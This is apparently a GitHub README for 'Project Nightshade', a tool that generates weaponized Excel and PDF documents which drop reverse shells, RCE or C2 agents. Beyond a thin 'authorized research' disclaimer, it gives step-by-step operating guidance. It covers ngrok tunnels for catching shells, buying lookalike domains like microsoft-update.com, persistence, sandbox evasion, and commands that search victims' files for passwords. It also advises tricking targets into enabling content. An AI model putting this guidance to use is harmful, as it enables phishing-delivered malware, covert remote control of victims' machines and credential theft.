# Project Nightshade - Advanced Document Dropper & C2 

**By:** ek0ms savi0r  
**A sophisticated penetration testing framework for authorized security research only.**

## Overview

Project Nightshade is an advanced Document dropper system with integrated Command & Control (C2) capabilities. It creates weaponized Excel and PDF files that deploy in-memory, fileless payloads with multiple persistence mechanisms and encrypted communications.

## Features

- **Multiple Document Types**: Excel (.xlsx) and PDF (.pdf) document support
- **Multiple Payload Options**: Reverse Shell, RCE, Full C2 Agent
- **Automatic Ngrok Integration**: Full TCP tunnel support for reverse shells
- **OPSEC-Focused**: Domain rotation, ngrok tunneling, anti-analysis checks
- **Encrypted Communications**: AES-256 encrypted C2 channels
- **Persistence**: Multiple persistence mechanisms (scheduled tasks, registry, WMI)
- **Stealth**: Fileless execution, memory-only payloads
- **Flexible Delivery**: Ngrok, domain rotation, or custom domains
- **Adaptive Payloads**: Different techniques for Excel vs PDF exploitation

## Installation

### 1. Clone the Repository

```bash
git clone https://github.com/ekomsSavior/project_nightshade.git
cd project_nightshade
```

### 2. Install Dependencies

```bash
sudo apt update
pip3 install pycryptodome requests flask --break-system-packages
```

### 3. Install ngrok (for tunneling)

```bash 
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

### 4. Authenticate Ngrok

```bash
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

##  Quick Start Guide

### Option A: Reverse Shell T(Easiest Setup)

1. **Start C2 Server:**
   ```bash
   python3 nightshade_staging.py
   # Server starts on port 8080, reverse shell handler on port 4444
   ```

2. **Generate Dropper in seperate terminal:**
   ```bash
   python3 nightshade_dropper.py
   ```
   - Choose payload: `1` (Reverse Shell)
   - Use default IP/port or enter your public IP
   - Choose delivery: `1` (Ngrok tunneling)

3. **The tool AUTOMATICALLY:**
   - Starts ngrok TCP tunnel for port 4444
   - Configures payload with correct ngrok address
   - Generates your malicious document

4. **Deliver the document and wait for connections!**

### Option B: RCE/Full C2 (HTTP-Based)

1. **Start C2 Server:**
   ```bash
   python3 nightshade_staging.py
   ```

2. **Start Ngrok HTTP Tunnel:**
   ```bash
   ngrok http 8080
   ```

3. **Generate Dropper:**
   ```bash
   python3 nightshade_dropper.py
   ```
   - Choose payload: `2` (RCE) or `3` (Full C2)
   - Choose delivery: `1` (Ngrok tunneling)

4. **The tool AUTOMATICALLY detects your ngrok URL and configures the payload!**

## Detailed Usage

### C2 Server Configuration

The staging server runs on two ports:
- **HTTP Server**: Port 8080 (for templates and C2 communications)
- **Reverse Shell Handler**: Port 4444 (for direct shell connections)

### Payload Types Explained

#### 1. Reverse Shell (Payload Option 1)
- **Direct Connection**: Connects directly to your IP:4444
- **Ngrok Tunnel**: **AUTOMATIC** - Tool creates TCP tunnel and configures payload
- **Best for**: Immediate interactive access

#### 2. RCE + Persistence (Payload Option 2)  
- **HTTP-Based**: Communicates via HTTP requests to C2 server
- **Ngrok Compatible**: Works with HTTP tunnels (ngrok http 8080)
- **Best for**: Stealthy command execution

#### 3. Full C2 Agent (Payload Option 3)
- **Advanced Features**: Encrypted comms, persistence, anti-analysis
- **HTTP-Based**: Uses C2 HTTP endpoints
- **Ngrok Compatible**: Works with HTTP tunnels
- **Best for**: Long-term operations

### Ngrok Configuration Made Simple

#### For Reverse Shell (Payload 1):
```bash
# The tool handles this AUTOMATICALLY!
# It will:
# 1. Start ngrok tcp 4444
# 2. Extract the public address (e.g., 1.tcp.ngrok.io:12345)
# 3. Configure the payload with this address
```

#### For RCE/Full C2 (Payloads 2 & 3):
```bash
# Manual option (or let the tool detect it)
ngrok http 8080

# The tool will automatically detect your ngrok URL
# and use it in the payload configuration
```

### Configuration Examples

#### Reverse Shell with Ngrok:
```
Payload Type: 1 (Reverse Shell)
Delivery Method: 1 (Ngrok tunneling)
```

### RCE with Ngrok :
```
Payload Type: 2 (RCE + Persistence)  
Delivery Method: 1 (Ngrok tunneling)
# Tool automatically detects your HTTP ngrok URL
```

#### RCE with Custom Domain:
```
Payload Type: 2 (RCE + Persistence)  
Delivery Method: 3 (Custom domain)
Custom Domain: your-c2-domain.com
```

### Custom Domain vs. Ngrok Domain

**Ngrok Domain (Automatic, Temporary):**
- `https://abc123-def4-567.ngrok-free.app` (HTTP tunnel)
- `1.tcp.ngrok.io:12345` (TCP tunnel)  
- **Provided by ngrok**, random, changes every time
- **Use Delivery Method: 1 (Ngrok tunneling)**

**Custom Domain (Your Own, Permanent):**
- `https://assets.microsoft-update.com` (your owned domain)
- `c2.yourcompany.com` (your subdomain)
- **You own this domain**, it doesn't change
- **Use Delivery Method: 3 (Custom domain)**

### When to Use Each:

**Use Ngrok (Option 1) when:**
- Quick testing
- No budget for domains
- Temporary operations
- Don't care about reputation

**Use Custom Domain (Option 3) when:**
- Long-term operations  
- OPSEC matters (using legit-looking domains)
- You own trustworthy domains
- Budget for domain registration

### Example of Custom Domain Setup:

1. **Buy a domain:** `microsoft-update.com` (looks legit)
2. **Set up DNS:** Point to your server IP or ngrok
3. **In Nightshade:**
   ```
   Payload Type: 2 (RCE)
   Delivery Method: 3 (Custom domain)  
   Custom Domain: microsoft-update.com
   ```

The payload will then use `https://microsoft-update.com/template.ole` instead of ngrok URLs.

The payload numbering is:
```
    1 = Reverse Shell (raw TCP)

    2 = RCE + Persistence (HTTP C2)

    3 = Full C2 Agent (advanced HTTP C2)
```
    
## Document Types & Capabilities

### Excel Documents (.xlsx)
- **Technique**: OLE Template Injection
- **Trigger**: Document opening + "Enable Content"
- **Detection**: Microsoft Excel User-Agent
- **Persistence**: Excel-specific startup scripts
- **Advantages**: Higher success rate in corporate environments

### PDF Documents (.pdf)
- **Technique**: JavaScript payload execution
- **Trigger**: Document opening (auto-executes)
- **Detection**: Adobe Reader User-Agent
- **Persistence**: Reader-specific update mechanisms
- **Advantages**: No "Enable Content" prompt needed

## C2 Operations

### Monitoring Connections

#### For Reverse Shell:
```bash
# Connections appear automatically in the C2 server console
[+] Reverse shell connection from 192.168.1.100:51542
```

#### For RCE/Full C2:
```bash
# Check active sessions
curl http://localhost:8080/c2/sessions

# View server statistics
curl http://localhost:8080/admin/stats
```

### Example C2 Commands

```bash
# System reconnaissance
whoami
systeminfo
ipconfig /all

# Lateral movement  
net view
net user /domain

# Data collection
dir C:\Users\ /s | findstr "password|secret|key"
```

## OPSEC Considerations

### Infrastructure OPSEC

**Ngrok Best Practices:**
```
# Region selection for better performance
ngrok http 8080 --region eu

# Custom subdomains (plus plan required)
ngrok http 8080 --subdomain your-custom-name

# Available regions: us, eu, au, ap, sa, jp, in
```

**Domain Rotation:**
- Built-in domain rotation for template delivery
- Uses legitimate-looking Microsoft/Adobe domains
- Automatically cycles for operational security

### Anti-Analysis Features

- Sandbox detection (VM, sandbox, debugger checks)
- Application-specific evasion techniques
- Dynamic payload generation based on client type
- Fileless, in-memory execution

## Troubleshooting

### Common Issues & Solutions

** Reverse shell not connecting:**
- Ensure you're using the latest version with ngrok TCP support
- The tool now handles this automatically - no manual configuration needed

** Ngrok tunnel not detected:**
- Make sure ngrok is authenticated: `ngrok config add-authtoken YOUR_TOKEN`
- Check if ngrok is running: `pgrep ngrok`

** "Enable Content" not clicked:**
- Use PDF format for auto-execution
- Social engineering: make document look legitimate

** Quick Fix Checklist:**
1. Update to latest version
2. Use payload option 1 for easiest setup
3. Let the tool handle ngrok automatically
4. Start with Excel documents (higher success rate)

### Debug Mode

Enable verbose logging by checking the C2 server console for detailed connection information and errors.

## Pro Tips

1. **Start Simple**: Use Reverse Shell (option 1) for easiest setup
2. **Let the Tool Work**: Don't manually start ngrok - the tool handles it
3. **Test Locally First**: Try with direct IP before using ngrok
4. **Use Both Formats**: Excel for corps, PDF for individual targets
5. **Monitor Console**: Watch the C2 server for real-time connection info

## Legal & Ethical Notice

**FOR AUTHORIZED SECURITY RESEARCH ONLY**

**This tool is intended for:**
- Penetration testing with explicit permission
- Security research in controlled environments
- Educational purposes in ethical hacking courses

**the dev of this tool assumes no liability and is not responsible for any misuse or damage caused by this program.**

## Companion clean up script, **lab_cleaner**:

Lab Cleaner is a defensive utility for Linux that helps you remove persistence and processes left behind when testing your own malware, droppers, or payloads on a lab system.

https://github.com/ekomsSavior/lab_cleaner



**ek0ms savi0r** 
